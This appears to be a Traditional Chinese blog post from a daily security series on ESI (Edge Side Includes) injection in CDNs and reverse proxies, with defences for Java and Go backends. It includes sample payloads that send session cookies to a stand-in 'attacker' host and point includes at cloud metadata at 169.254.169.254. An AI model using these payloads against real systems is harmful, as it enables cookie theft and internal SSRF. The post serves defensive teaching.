---
title: "Day 63：ESI Injection — 當 CDN／反向代理替你「組裝」頁面時的新攻擊面"
date: 2026-06-25
tags: ["ESI Injection", "Edge Side Includes", "CDN", "Cache Poisoning", "SSRF"]
---

# Day 63：ESI Injection — 當 CDN／反向代理替你「組裝」頁面時的新攻擊面

接續 Day62 預告：今天談 **ESI Injection（Edge-Side Includes 注入）**。這是一篇**全新主題**，不是 SSTI（Day21／Day61）或 SSRF（Day10／Day53）的延伸——雖然攻擊「結果」會跟它們重疊（內部請求、資訊洩漏、RCE 邊緣案例），但**觸發點完全不同**：SSTI 是「應用程式的模板引擎」把字串當模板 render，ESI Injection 則是**你前面那台 CDN／反向代理**（Varnish、Akamai、Fastly、Oracle/部分企業 proxy）把回應 body 裡的標籤當指令解析。

對後端工程師來說，這個攻擊面最陰險的地方是：**漏洞不在你的程式碼裡，而在你和使用者之間那一層你可能根本沒在管的基礎設施。** 你的 Java／Go 應用把使用者輸入「安全地」逸出成 HTML 回給上游，結果上游的 ESI 處理器又把它重新解讀了一次。

---

## 一、ESI 是什麼？為什麼它能被注入

ESI（Edge Side Includes）是一個 2001 年的 W3C 提案標準，用來讓**邊緣節點（CDN／反向代理）在快取層組裝頁面**。概念很簡單：origin server 回一個「殼」，裡面放特殊標籤，邊緣節點看到標籤後自己去抓片段、填值、拼起來再回給使用者。

最常見的標籤：

```html
<!-- 邊緣節點會去抓這個 URL 的內容，貼進來 -->
<esi:include src="https://internal-service/fragment/header" />

<!-- 條件、變數 -->
<esi:vars>$(HTTP_COOKIE{session})</esi:vars>

<!-- 註解（部分實作支援 inline / try / except） -->
<esi:remove>...</esi:remove>
```

它的好處是「頁面大部分可以被快取，只有 header 的使用者名稱這種小片段每次重組」。Varnish（搭配 VMOD esi / `beresp.do_esi`）、Fastly、Akamai 都支援。

**問題出在這個處理模型：** 邊緣節點**不知道**回應 body 裡哪些 ESI 標籤是「你 origin 故意放的」，哪些是「使用者輸入反射進去的」。它只認標籤。所以如果：

1. 上游有開 ESI 處理（對某些 Content-Type / 某些 header 條件成立時）。
2. 你的 origin 把使用者可控的內容**未逸出**地反射進回應。
3. 使用者塞了一段 `<esi:include src="...">`。

那麼**邊緣節點就會替攻擊者執行那個 include**。注意：這跟 XSS 不一樣，XSS 是在「瀏覽器」執行;ESI Injection 是在**伺服器端的邊緣節點**執行,因此能打到使用者瀏覽器碰不到的內網。

### 怎麼判斷上游有沒有開 ESI？

經典的偵測 payload(無害版):

```html
<esi:include src="http://attacker-controlled/probe" />
```

或更輕量的、用算術判斷有沒有被處理:

```html
x=<esi:vars>$(HTTP_HOST)</esi:vars>
```

如果回應裡 `<esi:...>` 標籤**消失了**(被處理掉了)、或 attacker 收到 probe 請求,就代表上游在做 ESI。很多團隊根本不知道自己的 CDN 設定打開了 ESI(例如預設對 `Surrogate-Control: content="ESI/1.0"` 這個回應 header 反應)。

---

## 二、ESI Injection 能造成什麼危害

把 ESI 想成「攻擊者能在你的邊緣節點上下指令」,危害分四類:

**1. SSRF(最直接)**
`<esi:include src="http://169.254.169.254/latest/meta-data/iam/...">`——邊緣節點替攻擊者打雲端 metadata、內網服務。這跟 Day53 SSRF 的後果相同,但**請求是從 CDN 節點發出的**,你應用層的 SSRF 防線(safe HTTP client、egress 控制)完全管不到。

**2. Cookie / Session 竊取(繞過 HttpOnly)**
ESI 變數可以讀取請求的 cookie:

```html
<esi:include src="http://attacker/log?c=$(HTTP_COOKIE{session})" />
```

注意這招的可怕之處:`HttpOnly` 是擋「瀏覽器 JS 讀 cookie」,但 ESI 是在**邊緣節點**讀,`HttpOnly` 完全無效。這是 ESI Injection 跟 XSS 最不一樣、也最常被低估的點。

**3. Cache Poisoning(承 Day30)**
如果被注入的回應**會被快取**,攻擊者就能把惡意 include 結果(或 XSS payload)寫進共享快取,影響後續所有使用者。ESI + 可快取回應是 Day30 Web Cache Poisoning 的一個專屬變體。

**4. 邊緣端 SSTI / RCE(視實作)**
部分 ESI 實作支援更強的能力,例如 Akamai 早期支援 `<esi:include>` 搭配 XSLT(`dca="xslt"`),而 XSLT 可被串成 RCE/檔案讀取。某些實作的 `<esi:vars>` 表達式也接近一個小型模板引擎。這就是為什麼 ESI Injection 常被歸進「邊緣端 SSTI」的家族。

---

## 三、後端情境:你以為你逸出了,但你沒有

來看一個**後端工程師最容易中招**的具體場景。需求很單純:錯誤頁要把使用者輸入的搜尋字串顯示出來。

### Java(Spring)反例

```java
@GetMapping("/search")
public ResponseEntity<String> search(@RequestParam String q) {
    // 開發者「有」做 HTML 逸出,自認安全
    String safeQ = HtmlUtils.htmlEscape(q);
    String body = "<html><body>找不到:" + safeQ + "</body></html>";
    return ResponseEntity.ok()
            .contentType(MediaType.TEXT_HTML)
            // ⚠️ 致命:這個 header 讓上游 CDN 對這頁啟用 ESI
            .header("Surrogate-Control", "content=\"ESI/1.0\"")
            .body(body);
}
```

這裡有兩個獨立的問題交織:

1. **HTML 逸出 ≠ ESI 逸出。** `htmlEscape` 會把 `<` 變成 `&lt;`,理論上 `<esi:include>` 也會被逸出掉——**這是對的防線**。但只要任何一條路徑漏掉逸出(例如某個欄位走了 raw 輸出、或從 DB 撈出未逸出的舊資料、或 JSON 轉 HTML 時雙重解碼),ESI 標籤就活了。
2. **`Surrogate-Control: content="ESI/1.0"` 是 origin 主動告訴 CDN「這頁請幫我做 ESI」。** 很多人是從範例複製貼上、或被某個 library 預設加上,根本沒意識到它把整頁變成 ESI 處理對象。

中招的請求:

```
GET /search?q=<esi:include src="http://attacker/x?c=$(HTTP_COOKIE)"/>
```

若 origin 某處未逸出,CDN 就替攻擊者送出帶 cookie 的請求。

### 為什麼「我只是回 JSON / 純文字」也可能中

Varnish 預設只有在你 VCL 寫 `set beresp.do_esi = true;` 時才處理;但有些設定是「對特定 Content-Type 或特定 Surrogate header 自動啟用」。如果你的 API 回 `text/html` 或回應帶了 surrogate header,而你又把使用者輸入反射進 body(例如 error message、echo 參數),風險就成立。**關鍵不是你「想不想」做 ESI,而是上游「會不會」做。**

---

## 四、防禦:三道防線,後端能掌握的有兩道

ESI Injection 的根因橫跨「應用層」和「邊緣層」,所以防禦要分層。後端工程師能直接控制的是第一、二道。

### 防線一(應用層):永遠逸出反射內容,且別亂發 surrogate header

最核心、你 100% 能控制的一條:**任何反射進回應 body 的使用者輸入,都要做輸出逸出;而且要確認逸出涵蓋 ESI 標籤字元(`<`、`>`、`$`、`(`、`)`、`{`、`}`)。**

HTML context 下 `htmlEscape` 把 `<` → `&lt;` 已足夠讓 `<esi:` 失效。但要警惕「逸出後又被解碼」的路徑(template 二次處理、前端 `innerHTML` 還原、CDN 端解碼)。

Go 端,用 `html/template` 而不是字串拼接(承 Day02 / Day61 的老規矩):

```go
import "html/template"

var tmpl = template.Must(template.New("search").Parse(
    `<html><body>找不到:{{.Q}}</body></html>`,
))

func searchHandler(w http.ResponseWriter, r *http.Request) {
    q := r.URL.Query().Get("q")
    // html/template 會自動 context-aware 逸出,< 變 &lt;,ESI 標籤無法成立
    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    // ❗ 不要在不需要 ESI 時主動加 Surrogate-Control: content="ESI/..."
    _ = tmpl.Execute(w, struct{ Q string }{Q: q})
}
```

並且檢查:**你的服務有沒有在不知情的情況下送出 `Surrogate-Control: content="ESI/1.0"` 或 `Surrogate-Capability` 相關 header?** 沒有要做 ESI 就不要送。grep 你的程式碼與 framework 預設。

### 防線二(邊緣層):縮小 ESI 啟用範圍 + 標記回應

如果你的架構**確實需要** ESI(例如真的用邊緣組裝頁面),那要把它關進最小範圍:

- **預設關閉,白名單開啟。** Varnish:不要全域 `beresp.do_esi = true`,只對「你 origin 自己產生的、可信的」回應路徑開:

```vcl
sub vcl_backend_response {
    # 只有 origin 明確標記、且路徑在白名單內,才處理 ESI
    if (bereq.url ~ "^/internal-rendered/"
        && beresp.http.X-Enable-ESI == "1") {
        set beresp.do_esi = true;
    }
    # 把這顆內部 header 拿掉,不讓它外洩
    unset beresp.http.X-Enable-ESI;
}
```

重點是:**用一個攻擊者無法偽造的 origin-only 訊號(內部 header,且在邊緣 unset 掉)來決定要不要做 ESI**,而不是對所有回應、或對使用者能影響的條件做 ESI。

- **限制 `esi:include` 的目標。** 多數邊緣平台可設定只允許 include 特定白名單來源(relative URL、或限定 host),關掉對任意外部 URL 的 include——這直接把 SSRF 路徑斷掉。
- **ESI 處理的回應,其 cache key 要把使用者輸入納入(或乾脆不快取)**,避免一個人的注入結果污染共享快取(承 Day30、Day58 的 `Vary` / cache key 思路)。

### 防線三(縱深):egress 控制

承 Day53,給邊緣節點本身做 egress 限制:邊緣節點不該能任意打內網與雲 metadata。即使前兩道破了,egress allowlist 能讓 SSRF 打不到 `169.254.169.254`。這道通常要跟維運/平台團隊一起做。

---

## 五、Code Review / 偵測 checklist

寫給後端工程師,review PR 與盤點服務時用:

```text
[ ] 有沒有把使用者輸入反射進回應 body?(error message、echo、搜尋字串、檔名)
    → 一律輸出逸出;HTML context 用 html/template / htmlEscape,確認 < 被逸出。
[ ] 服務有沒有送 Surrogate-Control / Surrogate-Capability / X-... 觸發 ESI 的 header?
    → 不需要 ESI 就移除;grep framework 與 middleware 預設。
[ ] CDN/反向代理(Varnish/Fastly/Akamai)有沒有開 ESI?開在哪些路徑、什麼條件?
    → 找維運確認 VCL / 設定;預設關閉、白名單開啟。
[ ] ESI include 的目標有沒有來源白名單?能不能 include 任意外部 URL?
    → 限制 host;關掉任意 src。
[ ] 會被 ESI 處理的回應會不會進共享快取?cache key 有沒有納入使用者輸入?
    → 不快取或正確隔離 cache key。
[ ] 邊緣節點有沒有 egress 限制?能不能打 169.254.169.254 / 內網?
```

**偵測測試(可放進安全回歸測試):** 對每個會反射使用者輸入的 endpoint,送一個含 ESI 標籤的 payload,斷言回應 body 裡 `<` 已被逸出成 `&lt;`、且 `<esi:` 字面不存在於可被下游解析的位置:

```text
送出: q=<esi:include src="http://127.0.0.1/probe"/>
斷言: 回應 body 不含未逸出的 "<esi:include",且 probe 端點沒有收到請求
```

---

## 六、一句話總結

> ESI Injection 的本質是:**漏洞不在你的程式碼,而在你前面那台會「替你組裝頁面」的 CDN／反向代理**。它把你以為只在瀏覽器執行的反射內容,搬到伺服器邊緣執行——所以能繞過 `HttpOnly`、打進內網、污染共享快取。後端能掌握的兩道防線很實在:**(1) 反射內容一律輸出逸出(讓 `<esi:` 變 `&lt;esi:`),且不要無意間送出觸發 ESI 的 surrogate header;(2) 若真要用 ESI,預設關閉、用 origin-only 訊號白名單開啟、限制 include 目標、隔離 cache key。** 第三道 egress 控制交給平台團隊兜底。最危險的情況永遠是:你根本不知道上游開了 ESI——所以盤點比寫程式更重要。

---

## 延伸閱讀

- Day10 / Day53 SSRF——ESI include 造成的內部請求後果相同,但發起點在邊緣節點。
- Day30 Web Cache Poisoning——ESI + 可快取回應是它的專屬變體。
- Day21 / Day61 SSTI——同屬「把資料當指令解析」家族,但 ESI 在邊緣層、SSTI 在應用層。
- Day58 CORS / Day30——`Vary` 與 cache key 隔離的共通思路。

---

明天預告:**Day 64 — Web Cache Deception(網頁快取欺騙):全新主題,與 Day30 Cache Poisoning 是兩回事**
(這是全新主題,不是 Day30 的延伸。Day30 講「攻擊者污染快取內容」,Day64 要講相反方向——攻擊者用 **URL 路徑混淆**(例如 `/account/profile.css`、附加假副檔名、path normalization 差異)騙 CDN 把**別人的私密頁面**當成靜態資源快取下來,然後直接讀取受害者的快取版本。會用後端情境示範 origin 與 CDN 對「這個 URL 該不該快取」判斷不一致如何被利用,並給 Java／Go 後端「`Cache-Control: no-store` 正確設定、路徑/副檔名正規化、區分靜態與動態路由」的防禦寫法與 review 重點。)
